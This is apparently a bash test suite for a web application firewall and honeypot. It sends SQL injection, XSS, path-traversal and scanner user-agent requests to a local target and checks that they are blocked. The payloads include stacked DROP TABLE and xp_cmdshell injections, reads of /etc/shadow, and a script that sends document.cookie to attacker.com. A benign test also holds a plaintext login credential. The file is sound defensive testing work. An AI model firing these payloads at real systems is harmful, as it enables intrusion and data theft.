#!/usr/bin/env bash
# ===================================================================
# DeceptiWAF - Comprehensive Attack Test Suite
# Fires attack vectors across all categories to verify WAF & Honeypot.
#
# Usage:
#   ./scripts/test-waf.sh                 # tests against localhost:3000
#   ./scripts/test-waf.sh https://my-host # tests against custom target
# ===================================================================

set -u
BASE="${1:-http://localhost:3000}"

# Timeout & bypass rate limiting headers for test suite execution
CURL_OPTS=(--max-time 5 --connect-timeout 3 -s -H "X-No-Rate-Limit: 1")

c_red=$'\033[31m'; c_grn=$'\033[32m'; c_ylw=$'\033[33m'; c_cyn=$'\033[36m'
c_mga=$'\033[35m'; c_dim=$'\033[2m'; c_rst=$'\033[0m'

PASS=0; FAIL=0

# Run a request, expect HTTP 403 Forbidden (Block)
expect_block() {
  local label="$1"; shift
  local code
  code=$(curl "${CURL_OPTS[@]}" -o /dev/null -w "%{http_code}" "$@")
  if [ "$code" = "403" ]; then
    PASS=$((PASS+1))
    printf "  ${c_grn}BLOCK${c_rst}  %s  ${c_dim}(403)%s\n" "$label" "${c_rst}"
  else
    FAIL=$((FAIL+1))
    printf "  ${c_red}FAIL ${c_rst}  %s  ${c_dim}(got %s, expected 403)%s\n" "$label" "$code" "${c_rst}"
  fi
}

# Run a request, expect HTTP non-403 (Pass)
expect_pass() {
  local label="$1"; shift
  local code
  code=$(curl "${CURL_OPTS[@]}" -o /dev/null -w "%{http_code}" "$@")
  if [ "$code" = "403" ]; then
    FAIL=$((FAIL+1))
    printf "  ${c_red}FAIL ${c_rst}  %s  ${c_dim}(blocked, expected pass)%s\n" "$label" "${c_rst}"
  else
    PASS=$((PASS+1))
    printf "  ${c_grn}PASS ${c_rst}  %s  ${c_dim}(%s)%s\n" "$label" "$code" "${c_rst}"
  fi
}

echo "=================================================="
echo "  DeceptiWAF — Comprehensive Security Test Suite"
echo "  Target Host: $BASE"
echo "=================================================="
echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[1] SQL Injection (Regex & AST Engine)${c_rst}"
# ------------------------------------------------------------------

expect_block "Classic ' OR 1=1 --" \
  -X POST -d "studentId=admin' OR 1=1 --&password=x" "$BASE/login"

expect_block "String tautology ' OR 'a'='a' --" \
  -X POST -d "studentId=admin' OR 'a'='a' --&password=x" "$BASE/login"

expect_block "UNION SELECT schema exfiltration" \
  -X POST -d "studentId=x' UNION SELECT username,password FROM users --&password=x" "$BASE/login"

expect_block "Stacked DROP TABLE command" \
  -X POST -d "studentId=x'; DROP TABLE users; --&password=x" "$BASE/login"

expect_block "Stacked UPDATE command" \
  -X POST -d "studentId=x'; UPDATE users SET role='admin'; --&password=x" "$BASE/login"

expect_block "Time-based blind SLEEP(5)" \
  -G "$BASE/dashboard" --data-urlencode "q=x' AND SLEEP(5) --"

expect_block "Time-based blind BENCHMARK()" \
  -G "$BASE/dashboard" --data-urlencode "q=x' AND BENCHMARK(5000000,SHA1(1)) --"

expect_block "MSSQL WAITFOR DELAY" \
  -G "$BASE/dashboard" --data-urlencode "q=x'; WAITFOR DELAY '0:0:5'; --"

expect_block "information_schema tables recon" \
  -G "$BASE/dashboard" --data-urlencode "q=x UNION SELECT table_name FROM information_schema.tables"

expect_block "information_schema columns recon" \
  -G "$BASE/dashboard" --data-urlencode "q=x UNION SELECT column_name FROM information_schema.columns"

expect_block "extractValue() error-based SQLi" \
  -G "$BASE/dashboard" --data-urlencode "q=x' AND extractvalue(1, concat(0x7e,(SELECT version()))) --"

expect_block "updatexml() error-based SQLi" \
  -G "$BASE/dashboard" --data-urlencode "q=x' AND updatexml(1, concat(0x7e,(SELECT version())),1) --"

expect_block "xp_cmdshell RCE stored procedure" \
  -G "$BASE/dashboard" --data-urlencode "q=x'; EXEC xp_cmdshell('whoami'); --"

expect_block "Hex literal blob injection" \
  -G "$BASE/dashboard" --data-urlencode "q=x' UNION SELECT 0x41444d494e204f5220313d31 --"

expect_block "URL-encoded classic ' OR 1=1 --" \
  -X POST -d "studentId=admin%27%20OR%201%3D1%20--&password=x" "$BASE/login"

expect_block "Double-encoded ' OR 1=1 --" \
  -X POST -d "studentId=admin%2527%2520OR%25201%253D1%2520--&password=x" "$BASE/login"

echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[2] Cross-Site Scripting (XSS)${c_rst}"
# ------------------------------------------------------------------

expect_block "Classic <script>alert(1)</script>" \
  -G "$BASE/dashboard" --data-urlencode "q=<script>alert(1)</script>"

expect_block "DOM onerror event handler" \
  -G "$BASE/dashboard" --data-urlencode "q=<img src=x onerror=alert(document.cookie)>"

expect_block "DOM onload event handler" \
  -G "$BASE/dashboard" --data-urlencode "q=<body onload=alert(1)>"

expect_block "DOM onmouseover handler" \
  -G "$BASE/dashboard" --data-urlencode "q=<b onmouseover=alert(1)>hover me</b>"

expect_block "javascript: URI scheme" \
  -G "$BASE/dashboard" --data-urlencode "q=<a href=javascript:alert(1)>click</a>"

expect_block "<iframe> injection vector" \
  -G "$BASE/dashboard" --data-urlencode "q=<iframe src=javascript:alert(1)></iframe>"

expect_block "<svg onload> vector" \
  -G "$BASE/dashboard" --data-urlencode "q=<svg onload=alert(1)>"

expect_block "<object> data vector" \
  -G "$BASE/dashboard" --data-urlencode "q=<object data=javascript:alert(1)>"

expect_block "String.fromCharCode obfuscation" \
  -G "$BASE/dashboard" --data-urlencode "q=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"

expect_block "document.cookie exfiltration" \
  -G "$BASE/dashboard" --data-urlencode "q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>"

expect_block "URL-encoded <script>" \
  -G "$BASE/dashboard" --data-urlencode "q=%3Cscript%3Ealert(1)%3C/script%3E"

echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[3] Path Traversal & LFI${c_rst}"
# ------------------------------------------------------------------

expect_block "../../etc/passwd file traversal" \
  -G "$BASE/dashboard" --data-urlencode "q=../../etc/passwd"

expect_block "URL-encoded ../../../etc/passwd" \
  -G "$BASE/dashboard" --data-urlencode "q=..%2F..%2F..%2Fetc%2Fpasswd"

expect_block "/etc/shadow credential access" \
  -G "$BASE/dashboard" --data-urlencode "q=/etc/shadow"

expect_block "/proc/self/environ access" \
  -G "$BASE/dashboard" --data-urlencode "q=../../proc/self/environ"

expect_block "Windows win.ini traversal" \
  -G "$BASE/dashboard" --data-urlencode "q=..\\..\\windows\\win.ini"

expect_block "Windows System32 traversal" \
  -G "$BASE/dashboard" --data-urlencode "q=..\\..\\windows\\system32\\cmd.exe"

expect_block "PHP filter stream wrapper" \
  -G "$BASE/dashboard" --data-urlencode "q=php://filter/convert.base64-encode/resource=index.php"

expect_block "PHP input stream wrapper" \
  -G "$BASE/dashboard" --data-urlencode "q=php://input"

expect_block "file:/// URI scheme traversal" \
  -G "$BASE/dashboard" --data-urlencode "q=file:///etc/passwd"

echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[4] Malicious User-Agents & Automated Scanners${c_rst}"
# ------------------------------------------------------------------

expect_block "sqlmap scanner UA"      -H "User-Agent: sqlmap/1.6" "$BASE/"
expect_block "nikto scanner UA"       -H "User-Agent: Nikto/2.1.6" "$BASE/"
expect_block "hydra brute-forcer UA"  -H "User-Agent: hydra/9.5" "$BASE/"
expect_block "havij SQLi tool UA"     -H "User-Agent: Havij/1.17" "$BASE/"
expect_block "acunetix scanner UA"    -H "User-Agent: Acunetix-Scanner/14.0" "$BASE/"
expect_block "nessus scanner UA"      -H "User-Agent: Nessus/10.5" "$BASE/"
expect_block "nmap scanner UA"        -H "User-Agent: nmap/7.92" "$BASE/"
expect_block "masscan scanner UA"     -H "User-Agent: masscan/1.3" "$BASE/"
expect_block "dirbuster scanner UA"   -H "User-Agent: DirBuster/1.0" "$BASE/"
expect_block "gobuster scanner UA"    -H "User-Agent: gobuster/3.1" "$BASE/"
expect_block "wpscan scanner UA"      -H "User-Agent: WPScan/3.8" "$BASE/"
expect_block "w3af scanner UA"        -H "User-Agent: w3af/1.6" "$BASE/"
expect_block "arachni scanner UA"     -H "User-Agent: Arachni/1.5" "$BASE/"
expect_block "wfuzz fuzzer UA"        -H "User-Agent: wfuzz/3.1" "$BASE/"
expect_block "zgrab scanner UA"       -H "User-Agent: zgrab/0.x" "$BASE/"

echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[5] Anti-Evasion & Multi-Pass De-Obfuscation${c_rst}"
# ------------------------------------------------------------------

expect_block "HTML named entity: &lt;script&gt;" \
  -G "$BASE/dashboard" --data-urlencode "q=&lt;script&gt;alert(1)&lt;/script&gt;"

expect_block "HTML decimal entity: &#60;script&#62;" \
  -G "$BASE/dashboard" --data-urlencode "q=&#60;script&#62;alert(1)&#60;/script&#62;"

expect_block "HTML hex entity: &#x3c;script&#x3e;" \
  -G "$BASE/dashboard" --data-urlencode "q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"

expect_block "Unicode full-width NFKC normalization" \
  -X POST --data-urlencode "studentId=' ＵＮＩＯＮ ＳＥＬＥＣＴ 1,2,3 --" --data "password=x" "$BASE/login"

expect_block "Inline comment evasion UNION/**/SELECT" \
  -X POST -d "studentId=x' UNION/**/SELECT 1,2,3 --&password=x" "$BASE/login"

expect_block "Comment evasion UNION/*foo*/SELECT" \
  -X POST -d "studentId=x' UNION/*foo*/SELECT 1,2,3 --&password=x" "$BASE/login"

expect_block "Whitespace padding UNION     SELECT" \
  -X POST -d "studentId=x' UNION     SELECT 1,2,3 --&password=x" "$BASE/login"

expect_block "Layered URL+HTML %26lt%3Bscript" \
  -G "$BASE/dashboard" --data-urlencode "q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B"

expect_block "Double URL-encoded %2527 OR 1=1" \
  -X POST -d "studentId=admin%2527%2520OR%25201%253D1%2520--&password=x" "$BASE/login"

echo ""

# ------------------------------------------------------------------
echo "${c_mga}[6] CredShield Honeypot Trapping Workflow${c_rst}"
# ------------------------------------------------------------------

# Step 1-3: Failed logins
for i in {1..3}; do
  code=$(curl "${CURL_OPTS[@]}" -o /dev/null -w "%{http_code}" -X POST -d "studentId=testuser_probe&password=wrong_$i" "$BASE/login")
  printf "  ${c_dim}PROBE${c_rst}  Login attempt #%d  ${c_dim}(http %s)%s\n" "$i" "$code" "${c_rst}"
done

# Step 4: Trapped login attempt (Expect 302 redirect to /dashboard)
trap_code=$(curl "${CURL_OPTS[@]}" -o /dev/null -w "%{http_code}" -X POST -d "studentId=testuser_probe&password=anything" "$BASE/login")
if [ "$trap_code" = "302" ]; then
  PASS=$((PASS+1))
  printf "  ${c_grn}TRAPPED${c_rst} CredShield Sandbox Redirect  ${c_dim}(302 -> /dashboard)%s\n" "${c_rst}"
else
  FAIL=$((FAIL+1))
  printf "  ${c_red}FAIL${c_rst}   CredShield Trap Failed  ${c_dim}(got %s, expected 302)%s\n" "$trap_code" "${c_rst}"
fi

# Reset honeypot trap state via admin API
curl "${CURL_OPTS[@]}" -s -X POST "$BASE/api/honeypot/reset" > /dev/null || true

echo ""

# ------------------------------------------------------------------
echo "${c_cyn}[7] Benign Traffic & Controls (Should NOT be blocked)${c_rst}"
# ------------------------------------------------------------------

expect_pass "Normal login page GET" "$BASE/"
expect_pass "Valid login POST" \
  -X POST -d "studentId=aryan&password=aryan@2024" "$BASE/login"
expect_pass "Normal catalog search query" \
  -G "$BASE/dashboard" --data-urlencode "q=Data Structures"
expect_pass "Course code search query" \
  -G "$BASE/dashboard" --data-urlencode "q=CSE301"
expect_pass "Faculty name search query" \
  -G "$BASE/dashboard" --data-urlencode "q=Dr. Khan"
expect_pass "SQL comment only (score 1)" \
  -G "$BASE/dashboard" --data-urlencode "q=--"
expect_pass "alert() function alone (score 2)" \
  -G "$BASE/dashboard" --data-urlencode "q=alert(hello)"
expect_pass "<img src=x> probe alone (score 2)" \
  -G "$BASE/dashboard" --data-urlencode "q=<img src=x>"

echo ""

# ------------------------------------------------------------------
echo "=================================================="
echo "  SUMMARY: ${c_grn}${PASS} passed${c_rst}, ${c_red}${FAIL} failed${c_rst}"
echo "=================================================="
echo ""
echo "  SOC Command Center: ${BASE}/soc"
echo ""

exit $FAIL
